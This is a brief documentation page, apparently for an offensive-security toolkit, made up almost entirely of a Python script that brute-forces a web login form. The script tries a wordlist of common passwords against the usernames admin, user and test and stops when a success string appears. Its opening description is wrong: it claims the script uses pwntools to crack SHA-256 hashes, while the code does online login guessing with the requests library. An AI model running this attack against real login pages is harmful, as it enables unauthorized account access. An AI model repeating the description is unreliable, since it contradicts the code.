[documentation ](URL "")

---

This script uses the `pwntools` module to perform a SHA-256 password cracking attack.

```py linenums="1"
import requests
import sys

target = "http://127.0.0.1:5000"
usernames = ["admin", "user", "test"]
passwords = "top-100.txt"
needle = "Welcome back"

for username in usernames:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n").encode('latin-1')
            sys.stdout.write(f"[X] Attempting user:password -> {username}:{password.decode('latin-1')}\r")
            sys.stdout.flush()
            
            r = requests.post(target, data={"username": username, "password": password})
            
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write(f"\t[>>>>>] Valid password '{password}' found for user '{username}'!")
                sys.exit()

        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write(f"\t No password found for '{username}'!")
        sys.stdout.write("\n")
```

!!! warning "Legal Disclaimer"
    This script is for educational purposes only. Unauthorized use of this script against systems without explicit permission is illegal and unethical.